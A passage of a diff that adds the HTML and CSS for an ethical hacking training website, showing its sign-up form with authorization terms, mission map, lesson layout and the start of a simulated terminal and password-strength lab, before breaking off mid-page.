@@ -1,0 +1,1922 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>iHack.com — Ethical Hacking Academy</title>
+<style>
+/*──────────────────────────────────────────────
+  CSS VARIABLES & RESET
+──────────────────────────────────────────────*/
+:root{
+  --bg:#0a0e17;--panel:#111927;--panel2:#182236;--card:#1a2540;
+  --text:#eaf0ff;--muted:#8da0c2;--border:#253352;
+  --green:#00ff88;--blue:#00b4ff;--purple:#a855f7;--red:#ff4d6a;
+  --yellow:#ffd700;--cyan:#22d3ee;--orange:#ff8c00;
+  --radius:16px;--glow:0 0 30px rgba(0,255,136,.15);
+  --font:'Segoe UI',system-ui,-apple-system,sans-serif;
+  --mono:ui-monospace,'Cascadia Code',Consolas,monospace;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:var(--font);background:var(--bg);color:var(--text);line-height:1.65;overflow-x:hidden}
+a{color:var(--cyan);text-decoration:none}
+a:hover{text-decoration:underline}
+button,input,select,textarea{font:inherit;border:none;outline:none}
+button{cursor:pointer}
+img{max-width:100%;display:block}
+::-webkit-scrollbar{width:8px}
+::-webkit-scrollbar-track{background:#0d1320}
+::-webkit-scrollbar-thumb{background:#2a3f60;border-radius:9px}
+
+/*──────────────────────────────────────────────
+  3D ANIMATED BACKGROUND (CSS-only particles)
+──────────────────────────────────────────────*/
+#bg-canvas{position:fixed;inset:0;z-index:-1;overflow:hidden;pointer-events:none}
+.particle{position:absolute;border-radius:50%;opacity:.35;animation:floatUp linear infinite}
+@keyframes floatUp{
+  0%{transform:translateY(110vh) scale(.4) rotateZ(0deg);opacity:0}
+  10%{opacity:.35}
+  90%{opacity:.25}
+  100%{transform:translateY(-10vh) scale(1.1) rotateZ(360deg);opacity:0}
+}
+.grid-lines{position:fixed;inset:0;z-index:-1;
+  background-image:
+    linear-gradient(rgba(0,255,136,.03) 1px,transparent 1px),
+    linear-gradient(90deg,rgba(0,255,136,.03) 1px,transparent 1px);
+  background-size:60px 60px;
+  animation:gridScroll 20s linear infinite;
+}
+@keyframes gridScroll{to{background-position:60px 60px}}
+
+/*──────────────────────────────────────────────
+  GLOBAL UTILITIES
+──────────────────────────────────────────────*/
+.container{max-width:1200px;margin:0 auto;padding:0 24px}
+.hidden{display:none!important}
+.flex{display:flex}.flex-col{flex-direction:column}.items-center{align-items:center}.justify-between{justify-content:space-between}.gap-sm{gap:8px}.gap-md{gap:16px}.gap-lg{gap:24px}
+.text-center{text-align:center}
+.text-green{color:var(--green)}.text-blue{color:var(--blue)}.text-purple{color:var(--purple)}.text-red{color:var(--red)}.text-yellow{color:var(--yellow)}.text-cyan{color:var(--cyan)}.text-muted{color:var(--muted)}.text-orange{color:var(--orange)}
+.mt-sm{margin-top:8px}.mt-md{margin-top:16px}.mt-lg{margin-top:24px}.mt-xl{margin-top:40px}
+.mb-md{margin-bottom:16px}.mb-lg{margin-bottom:24px}
+
+/*──────────────────────────────────────────────
+  BUTTONS
+──────────────────────────────────────────────*/
+.btn{display:inline-flex;align-items:center;gap:8px;padding:12px 24px;border-radius:12px;font-weight:700;transition:.3s;position:relative;overflow:hidden}
+.btn::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,.1),transparent);opacity:0;transition:.3s}
+.btn:hover::after{opacity:1}
+.btn-primary{background:linear-gradient(135deg,var(--green),#00cc6a);color:#000;box-shadow:0 0 25px rgba(0,255,136,.3)}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 0 40px rgba(0,255,136,.5)}
+.btn-secondary{background:var(--panel2);color:var(--text);border:1px solid var(--border)}
+.btn-secondary:hover{border-color:var(--cyan);box-shadow:0 0 20px rgba(34,211,238,.2)}
+.btn-danger{background:transparent;color:var(--red);border:1px solid rgba(255,77,106,.3)}
+.btn-danger:hover{background:rgba(255,77,106,.1)}
+.btn-sm{padding:8px 16px;font-size:.85rem;border-radius:8px}
+.btn-block{width:100%;justify-content:center}
+.btn-glow{animation:btnGlow 2s ease-in-out infinite alternate}
+@keyframes btnGlow{from{box-shadow:0 0 20px rgba(0,255,136,.3)}to{box-shadow:0 0 50px rgba(0,255,136,.6)}}
+
+/*──────────────────────────────────────────────
+  CARDS & PANELS
+──────────────────────────────────────────────*/
+.card{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:24px;transition:.3s}
+.card:hover{border-color:rgba(0,255,136,.3);box-shadow:var(--glow);transform:translateY(-4px)}
+.card-glass{background:rgba(17,25,39,.85);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px)}
+.panel{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:28px}
+.chip{display:inline-block;padding:4px 12px;border-radius:20px;font-size:.75rem;font-weight:700}
+.chip-green{background:rgba(0,255,136,.12);color:var(--green)}
+.chip-blue{background:rgba(0,180,255,.12);color:var(--blue)}
+.chip-purple{background:rgba(168,85,247,.12);color:var(--purple)}
+.chip-red{background:rgba(255,77,106,.12);color:var(--red)}
+.chip-yellow{background:rgba(255,215,0,.12);color:var(--yellow)}
+.chip-orange{background:rgba(255,140,0,.12);color:var(--orange)}
+
+/*──────────────────────────────────────────────
+  INPUTS & FORMS
+──────────────────────────────────────────────*/
+.input-group{margin-bottom:18px}
+.input-group label{display:block;margin-bottom:6px;font-weight:600;font-size:.9rem;color:var(--muted)}
+.input-group input,.input-group select,.input-group textarea{width:100%;padding:12px 16px;background:var(--bg);border:1px solid var(--border);border-radius:10px;color:var(--text);transition:.3s}
+.input-group input:focus,.input-group select:focus,.input-group textarea:focus{border-color:var(--green);box-shadow:0 0 15px rgba(0,255,136,.15)}
+.input-group select option{background:var(--panel);color:var(--text)}
+
+/*──────────────────────────────────────────────
+  HEADER / NAV
+──────────────────────────────────────────────*/
+header{position:sticky;top:0;z-index:100;background:rgba(10,14,23,.92);backdrop-filter:blur(20px);border-bottom:1px solid var(--border)}
+.nav{display:flex;align-items:center;justify-content:space-between;padding:14px 0;flex-wrap:wrap;gap:12px}
+.logo{font-size:1.5rem;font-weight:900;letter-spacing:-1px}
+.logo .dot{color:var(--green);font-size:2rem}
+.nav-links{display:flex;gap:4px;flex-wrap:wrap}
+.nav-links button{background:transparent;color:var(--muted);padding:10px 16px;border-radius:10px;font-weight:600;transition:.2s;border:1px solid transparent}
+.nav-links button:hover,.nav-links button.active{color:var(--green);background:rgba(0,255,136,.06);border-color:rgba(0,255,136,.15)}
+.user-bar{display:flex;align-items:center;gap:14px}
+.xp-bar{width:120px;height:8px;background:#1e2d4a;border-radius:20px;overflow:hidden}
+.xp-fill{height:100%;background:linear-gradient(90deg,var(--green),var(--cyan));border-radius:20px;transition:width .5s}
+.user-level{font-size:.8rem;color:var(--green);font-weight:700}
+.user-name{font-size:.85rem;color:var(--text);font-weight:600;max-width:100px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+#nav-user{display:none}
+
+/*──────────────────────────────────────────────
+  AUTH PAGE
+──────────────────────────────────────────────*/
+#page-auth{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:40px 20px}
+.auth-container{width:100%;max-width:480px}
+.auth-card{background:rgba(17,25,39,.9);backdrop-filter:blur(30px);border:1px solid var(--border);border-radius:24px;padding:40px;box-shadow:0 30px 80px rgba(0,0,0,.5)}
+.auth-card .logo-big{font-size:3rem;font-weight:900;text-align:center;margin-bottom:8px}
+.auth-card .logo-big .dot{color:var(--green)}
+.auth-subtitle{text-align:center;color:var(--muted);margin-bottom:28px;font-size:.95rem}
+.level-cards{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:20px}
+.level-card{padding:14px 10px;border:2px solid var(--border);border-radius:12px;text-align:center;cursor:pointer;transition:.3s;background:var(--bg)}
+.level-card:hover{border-color:var(--cyan)}
+.level-card.selected{border-color:var(--green);background:rgba(0,255,136,.06);box-shadow:0 0 20px rgba(0,255,136,.15)}
+.level-card .lc-icon{font-size:1.8rem;margin-bottom:6px}
+.level-card .lc-title{font-weight:700;font-size:.85rem}
+.level-card .lc-desc{font-size:.7rem;color:var(--muted);margin-top:4px}
+.terms-box{background:var(--bg);border:1px solid var(--border);border-radius:10px;padding:14px;margin:16px 0;max-height:120px;overflow-y:auto;font-size:.78rem;color:var(--muted);line-height:1.7}
+.checkbox-row{display:flex;align-items:flex-start;gap:10px;margin:14px 0;font-size:.85rem}
+.checkbox-row input[type=checkbox]{accent-color:var(--green);width:18px;height:18px;margin-top:2px;flex-shrink:0}
+
+/*──────────────────────────────────────────────
+  HOME PAGE
+──────────────────────────────────────────────*/
+.hero{padding:80px 0 50px;text-align:center;position:relative}
+.hero-badge{display:inline-flex;align-items:center;gap:8px;background:rgba(0,255,136,.08);border:1px solid rgba(0,255,136,.2);border-radius:30px;padding:8px 20px;font-size:.8rem;color:var(--green);font-weight:600;margin-bottom:20px}
+.hero h1{font-size:clamp(2.2rem,5vw,4rem);font-weight:900;letter-spacing:-2px;line-height:1.15;margin-bottom:16px}
+.hero h1 .highlight{background:linear-gradient(135deg,var(--green),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.hero-quote{max-width:700px;margin:0 auto 30px;font-style:italic;color:var(--muted);font-size:1.05rem;border-left:3px solid var(--green);padding-left:18px;text-align:left}
+.hero-quote span{color:var(--green);font-weight:700}
+.hero-actions{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+.stats-bar{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin:40px 0}
+.stat-card{background:var(--panel);border:1px solid var(--border);border-radius:14px;padding:20px;text-align:center;transition:.3s}
+.stat-card:hover{border-color:rgba(0,255,136,.3);transform:translateY(-3px)}
+.stat-card .stat-value{font-size:1.8rem;font-weight:900;background:linear-gradient(135deg,var(--green),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.stat-card .stat-label{font-size:.78rem;color:var(--muted);margin-top:4px;text-transform:uppercase;letter-spacing:1px}
+
+/*──────────────────────────────────────────────
+  SECTION HEADINGS
+──────────────────────────────────────────────*/
+.section-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;flex-wrap:wrap;gap:10px}
+.section-head h2{font-size:1.5rem;font-weight:800}
+.eyebrow{font-size:.75rem;font-weight:800;letter-spacing:2px;text-transform:uppercase;color:var(--green);margin-bottom:8px}
+
+/*──────────────────────────────────────────────
+  MISSION GRID
+──────────────────────────────────────────────*/
+.mission-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:18px}
+.mission-card{position:relative;overflow:hidden}
+.mission-card .mc-header{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px}
+.mission-card .mc-icon{font-size:2.2rem}
+.mission-card h3{font-size:1.1rem;font-weight:700;margin-bottom:6px}
+.mission-card p{font-size:.88rem;color:var(--muted);flex:1}
+.mission-card .mc-footer{display:flex;justify-content:space-between;align-items:center;margin-top:14px}
+.progress-bar{width:100%;height:6px;background:#1e2d4a;border-radius:10px;overflow:hidden;margin-top:10px}
+.progress-fill{height:100%;border-radius:10px;transition:width .5s}
+.pf-green{background:linear-gradient(90deg,var(--green),var(--cyan))}
+.locked-overlay{position:absolute;inset:0;background:rgba(10,14,23,.85);display:flex;align-items:center;justify-content:center;border-radius:var(--radius);font-size:1.1rem;color:var(--muted);gap:8px}
+
+/*──────────────────────────────────────────────
+  LESSON VIEW
+──────────────────────────────────────────────*/
+.lesson-layout{display:grid;grid-template-columns:260px 1fr;gap:22px;min-height:60vh}
+.lesson-sidebar{position:sticky;top:80px;align-self:start}
+.lesson-sidebar .card{padding:14px}
+.topic-btn{display:block;width:100%;text-align:left;padding:12px 14px;background:transparent;color:var(--muted);border-radius:10px;margin-bottom:4px;font-weight:600;font-size:.88rem;transition:.2s;border:1px solid transparent}
+.topic-btn:hover{background:var(--panel2);color:var(--text)}
+.topic-btn.active{color:var(--green);background:rgba(0,255,136,.06);border-color:rgba(0,255,136,.15)}
+.topic-btn .done-check{color:var(--green);margin-right:6px}
+.lesson-content .card{margin-bottom:18px}
+.lesson-content h2{font-size:1.4rem;margin-bottom:12px}
+.lesson-content h3{font-size:1.1rem;margin:18px 0 8px;color:var(--cyan)}
+.lesson-content ul,.lesson-content ol{padding-left:22px;color:var(--muted)}
+.lesson-content li{margin:8px 0}
+.lesson-content li strong{color:var(--text)}
+.info-box{border-left:4px solid var(--cyan);background:rgba(34,211,238,.06);padding:16px 20px;border-radius:0 12px 12px 0;margin:16px 0;font-size:.92rem}
+.info-box.warn{border-left-color:var(--yellow);background:rgba(255,215,0,.06)}
+.info-box.danger{border-left-color:var(--red);background:rgba(255,77,106,.06)}
+.example-box{background:var(--bg);border:1px solid var(--border);border-radius:12px;padding:18px;margin:16px 0;font-size:.9rem}
+.example-box code{color:var(--green);background:rgba(0,255,136,.08);padding:2px 7px;border-radius:5px;font-family:var(--mono);font-size:.85rem}
+.table-wrap{overflow-x:auto;margin:16px 0}
+.table-wrap table{width:100%;border-collapse:collapse;font-size:.88rem}
+.table-wrap th{background:var(--panel2);color:var(--green);padding:12px 14px;text-align:left;font-size:.8rem;text-transform:uppercase;letter-spacing:1px}
+.table-wrap td{padding:10px 14px;border-bottom:1px solid var(--border);color:var(--muted)}
+.table-wrap tr:hover td{background:rgba(0,255,136,.03)}
+.table-wrap code{color:var(--red);background:rgba(255,77,106,.1);padding:2px 6px;border-radius:4px;font-family:var(--mono);font-size:.82rem}
+
+/*──────────────────────────────────────────────
+  QUIZ
+──────────────────────────────────────────────*/
+.quiz-section{border-top:1px solid var(--border);padding-top:22px;margin-top:22px}
+.quiz-q{font-weight:700;margin-bottom:12px;font-size:1rem}
+.quiz-options{display:grid;gap:8px}
+.quiz-opt{background:var(--panel2);border:1px solid var(--border);border-radius:10px;padding:12px 16px;text-align:left;color:var(--text);transition:.2s;font-size:.92rem}
+.quiz-opt:hover:not(:disabled){border-color:var(--cyan);background:rgba(34,211,238,.06)}
+.quiz-opt.correct{border-color:var(--green)!important;background:rgba(0,255,136,.1)!important;color:var(--green)}
+.quiz-opt.wrong{border-color:var(--red)!important;background:rgba(255,77,106,.08)!important;color:var(--red)}
+.quiz-opt:disabled{opacity:.7;cursor:default}
+.quiz-feedback{margin-top:10px;padding:12px 16px;border-radius:10px;font-size:.9rem}
+.quiz-feedback.good{background:rgba(0,255,136,.08);color:var(--green);border:1px solid rgba(0,255,136,.2)}
+.quiz-feedback.bad{background:rgba(255,77,106,.08);color:var(--red);border:1px solid rgba(255,77,106,.2)}
+
+/*──────────────────────────────────────────────
+  NEWS PAGE
+──────────────────────────────────────────────*/
+.news-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:18px}
+.news-card{display:flex;flex-direction:column}
+.news-card .nc-date{font-size:.75rem;color:var(--green);font-weight:700;margin-bottom:8px}
+.news-card h3{font-size:1rem;margin-bottom:8px}
+.news-card p{font-size:.88rem;color:var(--muted);flex:1}
+.news-card .nc-tags{display:flex;gap:6px;margin-top:12px;flex-wrap:wrap}
+
+/*──────────────────────────────────────────────
+  AI BOT
+──────────────────────────────────────────────*/
+.bot-toggle{position:fixed;bottom:24px;right:24px;z-index:200;width:60px;height:60px;border-radius:50%;background:linear-gradient(135deg,var(--green),var(--cyan));color:#000;font-size:1.6rem;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 30px rgba(0,255,136,.4);transition:.3s;border:none}
+.bot-toggle:hover{transform:scale(1.1)}
+.bot-panel{position:fixed;bottom:100px;right:24px;z-index:200;width:380px;max-height:500px;background:var(--panel);border:1px solid var(--border);border-radius:20px;display:flex;flex-direction:column;box-shadow:0 20px 60px rgba(0,0,0,.5);overflow:hidden}
+.bot-header{padding:16px 20px;background:var(--panel2);border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
+.bot-header h4{font-size:.95rem}
+.bot-messages{flex:1;overflow-y:auto;padding:16px;display:flex;flex-direction:column;gap:10px;min-height:250px}
+.bot-msg{max-width:85%;padding:10px 14px;border-radius:14px;font-size:.88rem;line-height:1.5;animation:msgIn .3s ease}
+@keyframes msgIn{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.bot-msg.bot{background:var(--panel2);color:var(--text);align-self:flex-start;border-bottom-left-radius:4px}
+.bot-msg.user{background:rgba(0,255,136,.12);color:var(--green);align-self:flex-end;border-bottom-right-radius:4px}
+.bot-input{display:flex;gap:8px;padding:12px;border-top:1px solid var(--border)}
+.bot-input input{flex:1;background:var(--bg);border:1px solid var(--border);border-radius:10px;padding:10px 14px;color:var(--text)}
+.bot-input button{padding:10px 16px;border-radius:10px;background:var(--green);color:#000;font-weight:700}
+
+/*──────────────────────────────────────────────
+  PROFILE PAGE
+──────────────────────────────────────────────*/
+.profile-header{display:flex;align-items:center;gap:24px;flex-wrap:wrap}
+.profile-avatar{width:100px;height:100px;border-radius:50%;background:linear-gradient(135deg,var(--green),var(--cyan));display:flex;align-items:center;justify-content:center;font-size:2.5rem;font-weight:900;color:#000;flex-shrink:0}
+.profile-info h2{margin-bottom:4px}
+.profile-stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:14px;margin-top:24px}
+.badges-grid{display:flex;flex-wrap:wrap;gap:10px;margin-top:16px}
+.badge-item{padding:10px 16px;border:1px solid var(--border);border-radius:12px;font-size:.85rem;color:var(--muted);display:flex;align-items:center;gap:8px}
+.badge-item.earned{border-color:var(--yellow);color:var(--yellow);background:rgba(255,215,0,.06)}
+
+/*──────────────────────────────────────────────
+  TERMINAL
+──────────────────────────────────────────────*/
+.terminal{background:#040810;border:1px solid #1e3348;border-radius:14px;overflow:hidden;font-family:var(--mono)}
+.terminal-bar{padding:10px 16px;background:#0d1a2a;display:flex;align-items:center;gap:8px}
+.terminal-bar .dot{width:10px;height:10px;border-radius:50%}
+.terminal-bar .dot.r{background:#ff5f57}.terminal-bar .dot.y{background:#febc2e}.terminal-bar .dot.g{background:#28c840}
+.terminal-bar span{margin-left:12px;font-size:.8rem;color:var(--muted)}
+.terminal-output{height:300px;overflow-y:auto;padding:16px;font-size:.85rem;color:#88c8a8;white-space:pre-wrap;word-break:break-all}
+.terminal-input{display:flex;align-items:center;gap:8px;padding:12px 16px;border-top:1px solid #1e3348}
+.terminal-input span{color:var(--green);font-size:.85rem}
+.terminal-input input{flex:1;background:transparent;color:var(--green);font-family:var(--mono);font-size:.85rem}
+
+/*──────────────────────────────────────────────
+  TOAST
+──────────────────────────────────────────────*/
+#toast{position:fixed;top:80px;right:24px;z-index:300;max-width:360px;padding:16px 22px;background:rgba(0,255,136,.12);border:1px solid var(--green);color:var(--green);border-radius:14px;font-weight:600;font-size:.9rem;box-shadow:0 10px 40px rgba(0,0,0,.4);transform:translateX(120%);transition:transform .4s cubic-bezier(.22,1,.36,1);backdrop-filter:blur(10px)}
+#toast.show{transform:translateX(0)}
+#toast.error{background:rgba(255,77,106,.12);border-color:var(--red);color:var(--red)}
+
+/*──────────────────────────────────────────────
+  FOOTER
+──────────────────────────────────────────────*/
+footer{border-top:1px solid var(--border);padding:30px 0;text-align:center}
+footer .footer-brand{font-size:1.2rem;font-weight:800;margin-bottom:8px}
+footer .footer-brand .dot{color:var(--green)}
+footer p{color:var(--muted);font-size:.82rem;max-width:600px;margin:0 auto}
+.creator{margin-top:12px;font-size:.78rem;color:var(--border)}
+
+/*──────────────────────────────────────────────
+  SECURITY LOCK SCREEN
+──────────────────────────────────────────────*/
+.security-lock{position:fixed;inset:0;z-index:9999;display:flex;align-items:center;justify-content:center;padding:24px;background:rgba(4,8,16,.97);backdrop-filter:blur(24px);-webkit-backdrop-filter:blur(24px)}
+.security-lock.hidden{display:none!important}
+.security-lock-card{width:100%;max-width:430px;background:linear-gradient(180deg,rgba(17,25,39,.98),rgba(10,14,23,.98));border:1px solid rgba(0,255,136,.25);border-radius:24px;padding:34px;box-shadow:0 30px 100px rgba(0,0,0,.65),0 0 45px rgba(0,255,136,.08);text-align:center}
+.security-lock-icon{font-size:3.4rem;margin-bottom:10px;filter:drop-shadow(0 0 16px rgba(0,255,136,.35))}
+.security-lock-card h2{font-size:1.6rem;margin-bottom:8px}
+.security-lock-card p{color:var(--muted);font-size:.9rem;margin-bottom:20px}
+.security-code{width:100%;padding:13px 16px;background:var(--bg);border:1px solid var(--border);border-radius:12px;color:var(--text);text-align:center;font-family:var(--mono);letter-spacing:3px;font-size:1rem;transition:.25s}
+.security-code:focus{border-color:var(--green);box-shadow:0 0 18px rgba(0,255,136,.15)}
+.security-status{min-height:22px;margin:10px 0;font-size:.82rem;color:var(--muted)}
+.security-status.bad{color:var(--red)}
+.security-status.good{color:var(--green)}
+.security-lock-meta{margin-top:16px;padding-top:14px;border-top:1px solid var(--border);font-size:.72rem;color:var(--muted)}
+
+/*──────────────────────────────────────────────
+  RESPONSIVE
+──────────────────────────────────────────────*/
+@media(max-width:900px){
+  .lesson-layout{grid-template-columns:1fr}
+  .lesson-sidebar{position:static;display:flex;gap:6px;overflow-x:auto;padding-bottom:8px}
+  .lesson-sidebar .card{display:flex;gap:4px;padding:8px;flex-wrap:nowrap}
+  .topic-btn{min-width:150px;white-space:nowrap;margin:0}
+}
+@media(max-width:700px){
+  .stats-bar{grid-template-columns:repeat(2,1fr)}
+  .level-cards{grid-template-columns:1fr}
+  .hero h1{font-size:2rem}
+  .bot-panel{width:calc(100vw - 32px);right:16px}
+  .news-grid{grid-template-columns:1fr}
+  .nav-links{width:100%;justify-content:center}
+  .profile-header{flex-direction:column;text-align:center}
+}
+@media(max-width:480px){
+  .container{padding:0 14px}
+  .auth-card{padding:24px 18px}
+  .hero{padding:50px 0 30px}
+}
+</style>
+</head>
+<body>
+
+<!-- ANIMATED BACKGROUND -->
+<div class="grid-lines"></div>
+<div id="bg-canvas"></div>
+
+<!-- TOAST -->
+<div id="toast"></div>
+
+<!-- ═══════════════════════════════════════════
+     HEADER / NAV
+     ═══════════════════════════════════════════ -->
+<header id="main-header" class="hidden">
+  <div class="container">
+    <div class="nav">
+      <div class="logo"><span class="dot">⬡</span> iHack<span class="text-green">.com</span></div>
+      <div class="nav-links" id="nav-links">
+        <button data-page="home" class="active">🏠 Home</button>
+        <button data-page="learn">📚 Learn</button>
+        <button data-page="lab">🖥️ Lab</button>
+        <button data-page="news">📰 News</button>
+        <button data-page="profile">👤 Profile</button>
+      </div>
+      <div class="user-bar" id="nav-user">
+        <div>
+          <div class="user-name" id="nav-username"></div>
+          <div class="user-level" id="nav-level">Level 1</div>
+        </div>
+        <div class="xp-bar"><div class="xp-fill" id="nav-xp-fill" style="width:10%"></div></div>
+        <button class="btn btn-sm btn-secondary" id="btn-lock" title="Lock academy">🔒 Lock</button>
+         <button class="btn btn-sm btn-danger" id="btn-logout">Logout</button>
+      </div>
+    </div>
+  </div>
+</header>
+
+<!-- ═══════════════════════════════════════════
+     AUTH PAGE
+     ═══════════════════════════════════════════ -->
+<div id="page-auth">
+  <div class="auth-container">
+    <div class="auth-card">
+      <div class="logo-big"><span class="dot">⬡</span> iHack<span class="text-green">.com</span></div>
+      <p class="auth-subtitle">Join the Ethical Hacking Academy — Learn to defend, not destroy.</p>
+
+      <form id="auth-form" autocomplete="off">
+        <div class="input-group">
+          <label for="auth-name">Your Name (Codename)</label>
+          <input id="auth-name" type="text" placeholder="e.g., CyberWolf" required maxlength="30" minlength="2">
+        </div>
+        <div class="input-group">
+          <label for="auth-age">Age</label>
+          <input id="auth-age" type="number" min="10" max="99" placeholder="e.g., 18" required>
+        </div>
+
+        <label style="display:block;margin-bottom:10px;font-weight:700;font-size:.9rem;color:var(--muted)">Select Your Level</label>
+        <div class="level-cards" id="level-cards">
+          <div class="level-card" data-level="beginner">
+            <div class="lc-icon">🌱</div>
+            <div class="lc-title">Beginner</div>
+            <div class="lc-desc">I'm just starting out</div>
+          </div>
+          <div class="level-card" data-level="intermediate">
+            <div class="lc-icon">⚡</div>
+            <div class="lc-title">Intermediate</div>
+            <div class="lc-desc">I know some basics</div>
+          </div>
+          <div class="level-card" data-level="professional">
+            <div class="lc-icon">🔥</div>
+            <div class="lc-title">Professional</div>
+            <div class="lc-desc">Experienced learner</div>
+          </div>
+        </div>
+
+        <div class="terms-box">
+          <strong style="color:var(--green)">📜 Authorization & Terms:</strong><br><br>
+          1. All exercises are simulated — no real systems are targeted.<br>
+          2. You agree to use knowledge ethically and only on authorized systems.<br>
+          3. Your data is stored locally in this browser only — never transmitted.<br>
+          4. The content adapts to your selected level.<br>
+          5. You earn XP through learning, quizzes, and lab exercises.<br>
+          6. <strong>Rule Zero:</strong> Always get permission before testing any system.<br>
+          7. Creator takes no responsibility for misuse of knowledge.<br>
+          8. This is an educational platform — not a certification.
+        </div>
+
+        <div class="checkbox-row">
+          <input type="checkbox" id="auth-agree" required>
+          <label for="auth-agree">I understand these terms and commit to ethical learning practices.</label>
+        </div>
+
+        <button type="submit" class="btn btn-primary btn-block btn-glow mt-md">
+          🚀 Enter the Academy — Earn 10 Bonus XP
+        </button>
+      </form>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════
+     HOME PAGE
+     ═══════════════════════════════════════════ -->
+<div id="page-home" class="hidden">
+  <div class="container">
+    <div class="hero">
+      <div class="hero-badge">🔒 ETHICAL HACKING ACADEMY — AUTHORIZED TRAINING ZONE</div>
+      <h1>Think like a hacker.<br><span class="highlight">Secure like a pro.</span></h1>
+      <div class="hero-quote">
+        <span>"To catch a thief, you must think like a thief. To secure a network, you must understand the art of exploitation."</span>
+      </div>
+      <div class="hero-actions">
+        <button class="btn btn-primary btn-glow" id="btn-start-learning">🎮 Start Learning</button>
+        <button class="btn btn-secondary" data-page="lab">🖥️ Open Lab</button>
+        <button class="btn btn-secondary" data-page="news">📰 Cyber News</button>
+      </div>
+    </div>
+
+    <div class="stats-bar" id="home-stats">
+      <div class="stat-card"><div class="stat-value" id="home-xp">10</div><div class="stat-label">Total XP</div></div>
+      <div class="stat-card"><div class="stat-value" id="home-level">1</div><div class="stat-label">Player Level</div></div>
+      <div class="stat-card"><div class="stat-value" id="home-missions">0/12</div><div class="stat-label">Missions Done</div></div>
+      <div class="stat-card"><div class="stat-value" id="home-rank">Recruit</div><div class="stat-label">Rank</div></div>
+    </div>
+
+    <div class="info-box warn">
+      <strong>⚖️ Golden Rule:</strong> Always get explicit permission before testing any system. Every exercise here is a local simulation. Real unauthorized hacking is illegal and harmful.
+    </div>
+
+    <div class="section-head mt-xl">
+      <div><div class="eyebrow">YOUR JOURNEY</div><h2>Mission Map</h2></div>
+      <span class="text-muted" style="font-size:.85rem" id="level-indicator"></span>
+    </div>
+    <div class="mission-grid" id="mission-map"></div>
+
+    <div class="section-head mt-xl">
+      <div><div class="eyebrow">ACHIEVEMENTS</div><h2>Badges & Rewards</h2></div>
+    </div>
+    <div class="badges-grid" id="home-badges"></div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════
+     LEARN PAGE
+     ═══════════════════════════════════════════ -->
+<div id="page-learn" class="hidden">
+  <div class="container">
+    <div class="section-head">
+      <div><div class="eyebrow">KNOWLEDGE → PRACTICE → XP</div><h2>Learn & Play</h2></div>
+      <div class="flex gap-sm">
+        <button class="btn btn-sm btn-secondary" id="btn-refresh-task">🔄 Refresh Task</button>
+        <button class="btn btn-sm btn-secondary" id="btn-improve-diff">📈 Increase Difficulty</button>
+      </div>
+    </div>
+    <div class="lesson-layout">
+      <div class="lesson-sidebar" id="lesson-sidebar"></div>
+      <div class="lesson-content" id="lesson-content"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════
+     LAB PAGE
+     ═══════════════════════════════════════════ -->
+<div id="page-lab" class="hidden">
+  <div class="container">
+    <div class="eyebrow">EXPERIMENT WITHOUT RISK</div>
+    <h2 class="mb-lg">Cyber Lab</h2>
+    <p class="text-muted mb-lg">All exercises run entirely in this page. No real commands execute, no targets are contacted.</p>
+
+    <div class="panel mb-lg">
+      <div class="chip chip-green mb-md">LAB 01 · SANDBOX TERMINAL</div>
+      <h3 class="mb-md">🖥️ Simulated Hacking Terminal</h3>
+      <p class="text-muted mb-md">Practice ethical hacking commands in a safe sandbox. Type <code style="color:var(--green)">help</code> to begin.</p>
+      <div class="terminal">
+        <div class="terminal-bar"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div><span>defender@ihack ~ SIMULATION ONLY</span></div>
+        <div class="terminal-output" id="term-output"></div>
+        <form class="terminal-input" id="term-form">
+          <span>$</span>
+          <input id="term-input" placeholder="Type help" autocomplete="off" spellcheck="false" maxlength="200">
+        </form>
+      </div>
+    </div>
+
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:18px" id="lab-extras">
+      <div class="panel">
+        <div class="chip chip-blue mb-md">LAB 02 · PASSWORD LAB</div>
+        <h3 class="mb-md">🔑 Password Strength Tester</h3>
+        <p class="text-muted mb-md">Enter a <strong>fictional</strong> password to learn what makes passwords strong.</p>
+        <input id="pw-input" class="input-group" style="width:100%;padding:12px;background:var(--bg);border:1px solid var(--border);border-radius:10px;color:var(--text)" type="text" placeholder="Enter fictional password" autocomplete="off">
+        <div id="pw-result" class="mt-md text-muted">Waiting for input…</div>
+        <div class="progress-bar mt-sm"><div class="progress-fill pf-green" id="pw-bar" style="width:0%"></div></div>
+        <ul id="pw-checks" class="mt-md" style="list-style:none;font-size:.85rem"></ul>
+      </div>
+
+      <div class="panel">
+        <div class="chip chip-purple mb-md">LAB 03 · BINARY IP CONVERTER</div>
+        <h3 class="mb-md">🔢 Binary ↔ IP Address</h3>
+        <p class="text-muted mb-md">Convert between decimal IP addresses and binary notation.</p>
+        <div class="input-group">
